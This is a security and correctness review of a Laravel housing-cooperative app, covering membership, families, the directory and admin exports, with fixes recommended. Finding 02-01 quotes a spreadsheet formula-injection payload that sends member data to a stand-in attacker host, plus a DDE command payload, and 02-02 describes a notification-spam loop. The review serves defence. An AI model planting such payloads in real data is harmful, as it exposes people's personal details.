# Projects, members, families, directory & admin tools
_Review of main · scope: ProjectController, DirectoryController, HomeController, Http/Controllers/Manage/*, Http/Controllers/Member/* (people, families, invitations, join requests), related Requests/Resources, ProjectService, FamilyService, DirectoryService, PlanService, app/Models, app/Enums, app/helpers.php_

## Summary
This was a static review. Nothing was run. Tenancy is solid. Every project route goes through `ResolveProject` plus `scopeBindings()`, and child bindings resolve through relations on `Project`. The admin area sits behind `can:update`. `exists`/`unique` rules are scoped to the project. I found no cross-project IDOR and no mass-assignment hole, and fillable lists are tight. The real risks are:
- **CSV formula injection:** the admin exports write member-controlled names into cells as they are.
- **Notification spam:** two ask/withdraw loops let any verified user flood admins (push) and family members (email).
- **Unlogged purges:** a project deleted for good leaves no activity-log entry, because the insert hits a foreign key and the error is swallowed.

The rest are low-severity edges:
- a stale directory request after joining by invitation;
- archived families restored by anyone who reuses the name;
- admins pulled into a family without consent;
- missing lottery-running guards on admin people edits;
- a hidden validation error on the superadmin's create form;
- N+1 queries in the plan autosave and the directory;
- an array `?q=` that returns a 500;
- global unique project names;
- a race on a double "Join";
- i18n, a11y and doc nits.

## Findings
| # | Severity | Category | Title | Location |
|---|----------|----------|-------|----------|
| 02-01 | medium | security | CSV exports are open to spreadsheet formula injection | `app/Http/Controllers/Manage/ExportController.php:63` |
| 02-02 | medium | security | Ask/withdraw loops let any user spam admins (push) and family members (email) | `app/Services/DirectoryService.php:31` |
| 02-03 | medium | correctness | Purging a project leaves no activity-log entry (FK failure swallowed) | `app/Services/ProjectService.php:130` |
| 02-04 | low | correctness | A directory join request stays pending after the person joins by invitation | `app/Services/InvitationService.php:112` |
| 02-05 | low | correctness | Starting a family with an archived family's name inherits that household's ranking and history | `app/Http/Controllers/Member/FamilyController.php:111` |
| 02-06 | low | correctness | Members can silently pull family-less admins into their family | `app/Services/InvitationService.php:50` |
| 02-07 | low | correctness | Admin people edits and member "leave project" skip the lottery-running guard | `app/Http/Controllers/Manage/PeopleController.php:23` |
| 02-08 | low | correctness | Superadmin's "first admin" invitation errors land on a field the form doesn't show | `app/Http/Controllers/ProjectController.php:61` |
| 02-09 | low | performance | Plan autosave runs one SELECT per shape | `app/Services/PlanService.php:84` |
| 02-10 | low | performance | Directory page runs up to 2 extra queries per listed project | `app/Http/Resources/DirectoryProjectResource.php:40` |
| 02-11 | low | correctness | Array-valued `?q=` crashes list pages with a 500 | `app/Http/Controllers/DirectoryController.php:28` |
| 02-12 | low | security | Global unique project name reveals hidden/archived projects and allows name-squatting | `app/Http/Requests/ProjectRequest.php:19` |
| 02-13 | low | correctness | Double "Join" click races `firstOrCreate` into a 500 | `app/Services/DirectoryService.php:97` |
| 02-14 | low | i18n | Lottery event title and description are stored in the creator's language | `app/Services/ProjectService.php:41` |
| 02-15 | low | accessibility | Repeated action buttons in the directory and invitations have no accessible context | `resources/js/pages/Projects/Directory.tsx:26` |
| 02-16 | low | practices | Misplaced docblocks in `Project` describe the wrong methods | `app/Models/Project.php:193` |

### 02-01. CSV exports are open to spreadsheet formula injection
- **Severity / category:** medium / security
- **Location:** `app/Http/Controllers/Manage/ExportController.php:16-31` (people), `:33-46` (families), `:48-60` (units), `:63-76` (`csv()`)
- **Problem:** `csv()` writes every value with `fputcsv`. Nothing neutralises a leading `=`, `+`, `-`, `@`, tab or CR. The values include members' own `firstname`/`lastname`, which the only validation allows to be any `string|between:2,80` (`app/Http/Controllers/Settings/ProfileController.php:41-42`). They also include `phone`, `legal_id` and family names that members choose (`FamilyRequest.php:22-23`). The class docblock says the files are meant to be opened in spreadsheet programs.
- **Failure scenario:** A member sets their first name to `=HYPERLINK("https://evil.example/?d="&C2&D2,"ver")`, or names the family they start that way. An admin downloads `people.csv` or `families.csv` and opens it in Excel or LibreOffice. The cell runs as a formula: one click sends other members' phones and ID numbers to the attacker. DDE-style payloads (`=cmd|'/C calc'!A0`) may run, depending on the program's settings.
- **Recommended fix:** In `csv()`, prefix any string cell that starts with `=`, `+`, `-`, `@`, `\t` or `\r` with a single quote, as OWASP recommends. Add an export test with a name like `=1+1`.
- **Verification note:** I read `csv()` and the row builders, and confirmed that no input rule restricts leading characters in names.

### 02-02. Ask/withdraw loops let any user spam admins (push) and family members (email)
- **Severity / category:** medium / security
- **Location:** `app/Services/DirectoryService.php:31-58`, `app/Http/Controllers/DirectoryController.php:63-68`, `app/Services/FamilyService.php:27-47`, `app/Http/Controllers/Member/FamilyJoinRequestController.php:32-39`, `routes/web.php:120-123`, `routes/web.php:148-149`
- **Problem:** Each directory `ask()` creates one PRIVATE notification per project admin, or per superadmin when the project has no admins. Each one is broadcast and pushed through `PushNotification`. Each family `ask()` sends every family member an in-app notification plus a queued `FamilyRequestNotification` email. A withdraw (`DirectoryController::withdraw`) or a cancel (`FamilyJoinRequestController::destroy`) hard-deletes the pending row. After that, `ProjectPolicy::askToJoin` (no row, so allowed) and `FamilyService::ask` (no pending row, so allowed) accept a new ask at once. Only the ask routes are throttled (`throttle:10,1` and `throttle:30,1`). Withdraw and cancel have no throttle, and nothing dedupes or cools down a repeated ask.
- **Failure scenario:**
  - **Directory loop:** a verified user loops POST `/directory/{p}/request` and DELETE `/directory/{p}/request`. That is 10 push notifications a minute to every admin of a listed project that asks for approval, about 14,400 a day, from one account.
  - **Family loop:** inside a project, a member loops POST `families/{f}/requests` and DELETE `family-requests/{id}`. That is up to 30 in-app notifications a minute to each member of the target family, plus the emails. The emails go out whenever the queue worker handles the job before the cancel lands. Jobs that run after the cancel fail with `ModelNotFoundException` and fill `failed_jobs`.
- **Recommended fix:** Rate-limit per target, keyed on (user, project) or (user, family), across both ask and withdraw. Alternatively, keep withdrawn requests with a timestamp, and silence or refuse a re-ask within N minutes. Also throttle the withdraw and cancel routes.
- **Verification note:** I traced both loops through the routes, policies and services and the `NotificationService::send` push dispatch. No dedupe exists. The only `bundle()` dedupe applies to PROJECT notifications.

### 02-03. Purging a project leaves no activity-log entry (FK failure swallowed)
- **Severity / category:** medium / correctness (audit)
- **Location:** `app/Services/ProjectService.php:130-137`, `app/Models/Concerns/RecordsActivity.php:24-26`, `app/Services/ActivityLog.php:25-42`, `database/migrations/2026_10_30_000002_create_activity_log.php:22`
- **Problem:** `Project` uses `RecordsActivity`. `forceDelete()` fires `deleted`, which calls `ActivityLog::record('deleted', $project)` with `project_id` set to the row that was just deleted. `activity_log.project_id` is a constrained foreign key, so the INSERT fails with error 1452 on the production driver, MySQL (`.env.template:24`). `record()` wraps the insert in `rescue(..., report: false)`, so the failure is silent. `nullOnDelete` also blanks `project_id` on all earlier rows for that project.
- **Failure scenario:** A superadmin purges an archived project (`Platform/ProjectController.php:83`), or an admin deletes a project with no history, which goes through `ProjectService::remove` and then `purge`. The Activity console has no row saying who deleted it or when, and this is the most destructive action on the platform. Its earlier rows can no longer be filtered by project.
- **Recommended fix:** For a force delete, record with `project_id` null and keep the id and name in `subject_id`/`subject`. Or write an explicit `ActivityLog::record('purged', …)` with `project_id` null in `purge()`. Add a test asserting that a purge is logged.
- **Verification note:** I read the trait, the `ActivityLog` insert and the FK definition. No other code logs the purge.

### 02-04. A directory join request stays pending after the person joins by invitation
- **Severity / category:** low / correctness
- **Location:** `app/Services/InvitationService.php:112-147`, `app/Services/DirectoryService.php:60-76`, `app/Services/DirectoryService.php:94-102`, `app/Http/Controllers/Manage/JoinRequestController.php:16-32`, `app/Http/Controllers/Manage/InvitationController.php:31-37`, `app/Http/Middleware/HandleInertiaRequests.php:125`
- **Problem:** Only `DirectoryService::enter` deletes the user's `JoinRequest`. `InvitationService::accept` creates the membership through `Membership::firstOrNew` and never touches `join_requests`. `Membership`'s hooks only close `FamilyJoinRequest`s (`Membership.php:55-58`). `JoinRequestController` checks only `isPending()`, not whether the requester is already a member.
- **Failure scenario:** Ana asks to join from the directory. An admin invites her by email instead, and she accepts. Her request stays in Manage/Invitations "requests" and in the `join_requests` badge for good.
  - If an admin clicks Accept, `enter()` keeps her membership but re-broadcasts MEMBER_JOINED to the whole project, sends JOIN_ACCEPTED and emails a `JoinedNotification`.
  - If an admin clicks Decline, a current member is told the project declined her.
- **Recommended fix:** Delete the user's `JoinRequest` for the project in `InvitationService::accept`, or in a `Membership::created` hook. In `JoinRequestController`, return 404/409 when the requester already has a membership.
- **Verification note:** I grepped every `joinRequests()` deletion. Only `DirectoryService::enter` has one.

### 02-05. Starting a family with an archived family's name inherits that household's ranking and history
- **Severity / category:** low / correctness (privacy/integrity)
- **Location:** `app/Http/Controllers/Member/FamilyController.php:111-119`, `app/Http/Requests/FamilyRequest.php:24-26`, `app/Http/Controllers/Member/FamilyController.php:132-146`, `app/Services/Lottery/PreferencesService.php:27-41`
- **Problem:** `store()` looks up an archived family in the project by name only, restores it, overwrites `name`/`unit_type_id`, and moves the requester into it. The code comments show this is deliberate ("Someone starting theirs takes back an archived one of that name"). However, nothing checks that the requester ever belonged to that family. The restored row keeps:
  - its `unit_preferences`, which `PreferencesService::ranking` uses for units of the matching type;
  - its `avatar`;
  - its declined `FamilyJoinRequest`s, which `requestsFor` shows by name to anyone now in the family;
  - its activity history.
- **Failure scenario:** Family "Pérez" (unit type 2BR) ranked its units and was archived after its members left. An unrelated newcomer starts a family named "Pérez" with type 2BR. They inherit the old ranking, which the lottery uses unless they re-rank, plus the old photo and the names of people the old family declined. Two households are merged in the audit trail.
- **Recommended fix:** Only restore when the requester was a member of that archived family, checked through activity or membership history. Otherwise refuse the name, by applying the unique rule to trashed rows too, or create a fresh family. At minimum, clear preferences, declines and avatar when restoring for someone new.
- **Verification note:** I read `store()`, `FamilyRequest` (`withoutTrashed()` on store) and the `Family` relations. Soft delete does not clear the related rows.

### 02-06. Members can silently pull family-less admins into their family
- **Severity / category:** low / correctness (consent)
- **Location:** `app/Services/InvitationService.php:50-59`, `app/Services/InvitationService.php:199-210`, `app/Http/Controllers/Member/InvitationController.php:33-51`, `app/Models/User.php:184-189`
- **Problem:** The "familyless" fast path matches any membership with `family_id` null, including admins who deliberately have no family. Yet the app's own `User::isFamilylessIn` excludes admins (`! $membership->is_admin`), and `ProjectPolicy::createOwnFamily` says "an admin with none has no need of one". `ensureNotAlreadyIn` does not treat such an admin as already in a family. So `addToFamily` moves them at once, with no invitation and no consent.
- **Failure scenario:** An ordinary member enters the project admin's email on Member/Invitations. The admin's membership instantly gets that member's `family_id`. The admin now shows as part of that household, takes part in its lottery participation, and has to leave the family on their own.
- **Recommended fix:** Add `->where('is_admin', false)` to the fast-path query, matching `isFamilylessIn`, and send a normal invitation to admins.
- **Verification note:** I traced `invite()` with `$family` set and `$asAdmin = false` against an admin membership with a null `family_id`. The fast path for non-admin newcomers is intended and tested (`tests/UseCases/Membership/DirectoryTest.php:282`), so it is not reported.

### 02-07. Admin people edits and member "leave project" skip the lottery-running guard
- **Severity / category:** low / correctness
- **Location:** `app/Http/Controllers/Manage/PeopleController.php:23-58`, `app/Http/Controllers/Member/PeopleController.php:78-92`, `app/Models/Project.php:247-258`
- **Problem:** `ensureLotteryNotRunning()` exists so that "who takes part … holds still until it ends". It is called by `FamilyService::accept`/`leave` and by `Manage\FamilyController` store/destroy (`:25`, `:61`). It is not called by `Manage\PeopleController::update` (moving someone between families), `::destroy` (removing a person), or `Member\PeopleController::leave` (leaving the project).
- **Failure scenario:** While a run is RUNNING, from a manifest snapshot taken at start, an admin moves the only member of family A into family B. `discardIfEmpty` skips A because of the lock, so A stays empty but is still in the run. The run then gives a unit to a family with nobody in it, and the moved person is attached to B's result instead. The same move is refused when a member tries it through a family request.
- **Recommended fix:** Call `$project->ensureLotteryNotRunning()` at the start of `Manage\PeopleController::update` and `destroy`, and of `Member\PeopleController::leave`.
- **Verification note:** I grepped every `ensureLotteryNotRunning` caller (6), and none is in the people controllers.

### 02-08. Superadmin's "first admin" invitation errors land on a field the form doesn't show
- **Severity / category:** low / correctness
- **Location:** `app/Http/Controllers/ProjectController.php:61-78`, `app/Services/InvitationService.php:44-46`, `app/Services/InvitationService.php:212-223`, `resources/js/pages/Projects/Create.tsx:103-109`, `app/Services/ProjectService.php:60-68`
- **Problem:** When a superadmin picks "Someone I invite", `InvitationService::invite` throws `ValidationException`s keyed `email` (`account_blocked`, `limit_*`). The Create page binds only `first_admin_email` (plus name, description and options), and the app has no global handler for unbound validation errors.
- **Failure scenario:** A superadmin enters the address of a blocked account. The outer transaction rolls back correctly, but the page shows no message, so the form looks broken. Before the rollback, `ProjectService::create` had already dispatched the GLOBAL `project_created` notification. `NotificationSent` is a queued broadcast that carries the model, so online superadmins see a "project created" notice for a project that does not exist. The push job finds no row and does nothing.
- **Recommended fix:** In `ProjectController::store`, catch the `ValidationException` and rethrow its messages under `first_admin_email`. Send the creation notification after commit (`DB::afterCommit`).
- **Verification note:** I grepped `Create.tsx` and the layouts for error rendering. Only the field-bound errors are shown.

### 02-09. Plan autosave runs one SELECT per shape
- **Severity / category:** low / performance
- **Location:** `app/Services/PlanService.php:66-108` (query at `:84`), `app/Http/Requests/PlanRequest.php:30`, `resources/js/components/domain/PlanPanel.tsx:80-87`
- **Problem:** `update()` loads each submitted item with `$plan->items()->whereKey($item['id'])->first()` inside the loop. `PlanRequest` allows up to 2,000 items, and the editor sends the whole plan on every save. Unchanged items do not issue an UPDATE, because Eloquent's dirty check skips them.
- **Failure scenario:** A plan with 800 shapes costs about 800 primary-key SELECTs per autosave inside one transaction. The original report said saves take "seconds", which is overstated. The real cost is hundreds of milliseconds of avoidable round-trips per save while an admin draws.
- **Recommended fix:** Load once with `$items = $plan->items()->get()->keyBy('id')` and look up each id in `$items`.
- **Verification note:** I read the loop. `PlanItem` has no model events, so the cost is only the queries.

### 02-10. Directory page runs up to 2 extra queries per listed project
- **Severity / category:** low / performance
- **Location:** `app/Http/Resources/DirectoryProjectResource.php:40`, `app/Models/Project.php:200-204`, `app/Http/Controllers/DirectoryController.php:23-36`
- **Problem:** `standing()` calls `acceptsNewcomers()` for each project. When guests are off, that runs `unitTypes()->exists()` and then `activeLotteryRun()->exists()`, and the listing query preloads neither.
- **Failure scenario:** A full page of 24 projects costs up to 48 extra queries on every load and every search.
- **Recommended fix:** Add `withExists('unitTypes')` and a `withExists` for running/completed lottery runs to the directory query, and have `acceptsNewcomers()` use those attributes when they are present.
- **Verification note:** I read the resource and the model methods. The controller only eager-loads `joinRequests` and counts.

### 02-11. Array-valued `?q=` crashes list pages with a 500
- **Severity / category:** low / correctness
- **Location:** `app/Http/Controllers/DirectoryController.php:28-31`, `app/Http/Controllers/Member/PeopleController.php:29`, `app/Http/Controllers/Member/FamilyController.php:36`. The same pattern appears in `Member/ForumController.php:32`, `Member/EventController.php:27` and `Member/MediaController.php:41`.
- **Problem:** `$request->q` is used unchecked. It is interpolated into a `like` string (Directory, Forum) or passed to `scopeSearch(string $q)` (People, Families).
- **Failure scenario:** GET `/directory?q[]=x` hits "Array to string conversion", which Laravel turns into an `ErrorException`. GET `/projects/1/people?q[]=x` on a list longer than `lists.whole` raises a `TypeError`. Both return 500 and write to the error log.
- **Recommended fix:** Read the value with `$request->string('q')->toString()`, or validate `'q' => ['nullable', 'string', 'max:100']`.
- **Verification note:** I read each call site. `wholeOrPaged` applies the search closure only above `lists.whole`.

### 02-12. Global unique project name reveals hidden/archived projects and allows name-squatting
- **Severity / category:** low / security
- **Location:** `app/Http/Requests/ProjectRequest.php:19`, `database/migrations/2026_10_27_000001_create_projects_tables.php:15`, `app/Policies/ProjectPolicy.php:20-25`
- **Problem:** Project names are unique across the platform, archived (soft-deleted) projects included, both in the rule and in the DB index. Any verified user may submit the create form, with up to 2 unapproved projects (`config/limits.php:29`).
- **Failure scenario:**
  - **Existence leak:** a user tries "Cooperativa X" and gets "name already taken". That confirms an unlisted, unapproved or archived project of that name exists.
  - **Squatting:** a user can register a real cooperative's name first, which blocks the real one until a superadmin steps in.
- **Recommended fix:** Drop the global uniqueness, since ids identify projects, or scope it to the creator or organization.
- **Verification note:** I confirmed the `Rule::unique('projects','name')` rule and the `->unique()` column.

### 02-13. Double "Join" click races `firstOrCreate` into a 500
- **Severity / category:** low / correctness
- **Location:** `app/Services/DirectoryService.php:96-101`, `resources/js/pages/Projects/Directory.tsx:40-45`
- **Problem:** `enter()` uses `Membership::firstOrCreate`, and `memberships` has a unique index on (user_id, project_id). The Join button calls `router.post` with no in-flight guard. Inertia cancels the first visit and shows the response to the second.
- **Failure scenario:** A double-click sends two POST `/directory/{p}/join`. Both pass the `join` policy before either commits. The second INSERT hits the unique key and throws a `QueryException`, so the user sees a 500 even though they joined.
- **Recommended fix:** Use `Membership::createOrFirst`, and disable the button while the request is in flight.
- **Verification note:** The race window is plausible but not reproduced. The `created` hooks inside the transaction widen it.

### 02-14. Lottery event title and description are stored in the creator's language
- **Severity / category:** low / i18n
- **Location:** `app/Services/ProjectService.php:41-48`, `app/Http/Resources/EventResource.php:21-22`, `app/Http/Controllers/Manage/LotteryController.php:26`
- **Problem:** The lottery event is saved with `__('lottery.title')` and `__('lottery.default_description')` resolved in the creator's locale. The title can never be edited ("the title is fixed"), and `EventResource` and the frontend (`EventCard.tsx:81`) show the stored string.
- **Failure scenario:** A pt_BR member of a project started by an es_UY admin always sees "Sorteo", even though the app ships en, fr, it and pt_BR.
- **Recommended fix:** Have `EventResource` return `__('lottery.title')` when `isLottery()`. Store a null default description and render the translated default when it is empty.
- **Verification note:** I grepped the frontend for lottery title handling. None exists.

### 02-15. Repeated action buttons in the directory and invitations have no accessible context
- **Severity / category:** low / accessibility
- **Location:** `resources/js/pages/Projects/Directory.tsx:26-65`, `resources/js/pages/Projects/Index.tsx:105-108`
- **Problem:** Each directory card renders "Join", "Ask to join", "Withdraw" or "Open", and each pending invitation renders "Decline" and "Join". No button has an `aria-label` or `aria-describedby` tying it to its project.
- **Failure scenario:** A screen-reader user browsing by buttons hears "Join, Ask to join, Join, Open" and cannot tell which project each one acts on.
- **Recommended fix:** Add `aria-label={_('Join {project}', { project: project.name })}`, or `aria-describedby` pointing at the card's `Title`.
- **Verification note:** I read both components. The labels are bare `_()` strings.

### 02-16. Misplaced docblocks in `Project` describe the wrong methods
- **Severity / category:** low / practices
- **Location:** `app/Models/Project.php:193-200`, `app/Models/Project.php:244-251`
- **Problem:** The "listed and trusted" docblock that belongs to `isInDirectory()` sits stacked above `acceptsNewcomers()`. The "Whether preferences are locked" docblock that belongs to `lotteryLocked()` sits above `ensureLotteryNotRunning()`, which has its own.
- **Failure scenario:** IDEs show the wrong description on hover, and `lotteryLocked()` (running or completed) has none. That invites confusion with `ensureLotteryNotRunning()` (running only), the very distinction behind 02-07.
- **Recommended fix:** Move each docblock onto its method and delete the stacked duplicates.
- **Verification note:** I read the lines. In each case two `/** */` blocks sit back to back.

## Dropped
- **"Untested purge of a project with units/families (FK RESTRICT beside cascades)"** was dropped as speculative. `tests/Browser/Features/PlatformTest.php:69-99` already purges a project with a family and unit type on the MySQL test DB. Whether InnoDB's cascade order breaks for `units` too was not shown.

## Checked, nothing to report
- **Tenancy and IDOR:** `ResolveProject`, `scopeBindings()` on child models, and `can:update` on Manage.
- **Policies:** `ProjectPolicy`, `FamilyPolicy` and the superadmin bypass.
- **Mass assignment:** `$fillable` on Project, Family, Membership and JoinRequest. Writes from validated or `only()` data.
- **Validation scoping:** `exists`/`unique` rules scoped by `project_id`.
- **Contact-detail exposure:** names-only on `OwnFamily`, and gated search by email.
- **Last-admin protection:** `Manage\PeopleController`, `Member\PeopleController::leave`.
- **Family-decline enforcement:** on admin moves and invitations.
- **Model casts and relations.**
